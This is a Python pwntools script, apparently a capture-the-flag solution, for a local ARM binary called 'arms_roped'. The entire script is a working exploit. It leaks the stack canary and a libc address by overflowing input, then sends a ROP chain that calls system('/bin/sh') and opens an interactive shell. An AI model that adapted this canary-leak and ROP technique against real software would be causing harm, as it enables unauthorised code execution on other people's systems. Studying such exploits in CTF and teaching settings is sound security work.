#!/usr/bin/python3
from pwn import process, p32, u32

shell = process("./arms_roped")

shell.sendline(b"A" * 33)
shell.recvuntil(b"A" * 33)

canary = u32(shell.recv(4).rjust(4, b"\x00"))

shell.sendline(b"A" * 72)
shell.recvuntil(b"A" * 72)

libc_base = u32(shell.recv(4).rjust(4, b"\x00")) - 0x17525

offset = 32
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(canary)
payload += p32(0x0) * 3             # padding
payload += p32(libc_base + 0x16d7d) # pop {r6, r7, pc};
payload += p32(libc_base + 0x2f511) # system()
payload += p32(libc_base + 0xdce0c) # "/bin/sh"
payload += p32(libc_base + 0x2756b) # mov r0, r7; blx r6;

shell.sendline(payload)
shell.sendline(b"quit")

shell.recvlines(2)
shell.interactive()
